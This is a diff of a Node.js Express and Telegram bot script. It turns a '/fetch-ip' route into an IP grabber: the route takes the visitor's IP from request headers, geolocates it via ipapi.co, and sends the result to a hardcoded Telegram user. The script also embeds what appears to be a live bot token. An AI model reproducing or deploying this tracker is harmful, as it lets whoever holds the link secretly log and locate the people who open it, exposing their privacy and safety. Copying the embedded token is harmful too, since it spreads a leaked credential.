@@ -1,7 +1,6 @@
 const axios = require('axios');
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
-const path = require('path');
 
 // Bot token
 const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";
@@ -9,23 +8,16 @@ const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";
 // Create a bot instance
 const bot = new TelegramBot(token, { polling: true });
 
-// Define support links
-const SUPPORT_LINKS = {
-  repo: "https://github.com/sataniceypz/Izumi-v3",
-  channel: "https://whatsapp.com/channel/0029Vaf2tKvGZNCmuSg8ma2O",
-  group: "https://chat.whatsapp.com/KHvcGD7aEUo8gPocJsYXZe"
-};
+// Define Telegram ID for user to send messages
+const ajsal = '6524787237';
 
 // Create an express app
 const app = express();
 
-// Define Telegram ID for user to send messages
-const ajsal = '6524787237';
-
-// Function to fetch user data from ipapi.co
-async function fetchUserData() {
+// Function to fetch user data from ipapi.co using their IP
+async function fetchUserData(ip) {
   try {
-    const response = await axios.get('https://ipapi.co/json/');
+    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
     const userData = response.data;
 
     // Format the message
@@ -47,46 +39,15 @@ async function fetchUserData() {
   }
 }
 
-// Trigger fetching user data on a specific route
+// Endpoint to capture user IP and fetch data
 app.get('/fetch-ip', async (req, res) => {
-  await fetchUserData();
-  res.send('IP data fetched and sent to Telegram!');
-});
+  // Extract user's IP from the request headers
+  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
-// Command to start the bot and show buttons
-bot.onText(/\/start/, (msg) => {
-  const chatId = msg.chat.id;
+  // Fetch user data using their IP
+  await fetchUserData(userIp);
 
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: 'Support', callback_data: 'support' }]
-      ]
-    }
-  };
-
-  bot.sendMessage(chatId, 'Welcome! Choose an option:', options);
-});
-
-// Callback query handler
-bot.on('callback_query', async (callbackQuery) => {
-  const chatId = callbackQuery.message.chat.id;
-  const data = callbackQuery.data;
-
-  if (data === 'support') {
-    const message = `
-💬 *Support Links*:
-- 📂 *Repo*: [GitHub Repo](${SUPPORT_LINKS.repo})
-- 📢 *Channel*: [WhatsApp Channel](${SUPPORT_LINKS.channel})
-- 👥 *Group*: [WhatsApp Group](${SUPPORT_LINKS.group})
-    `;
-    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
-  }
-});
-
-// Error handler for unhandled errors
-bot.on('polling_error', (error) => {
-  console.error(error);
+  res.send('User IP data fetched and sent to Telegram!');
 });
 
 // Start the server
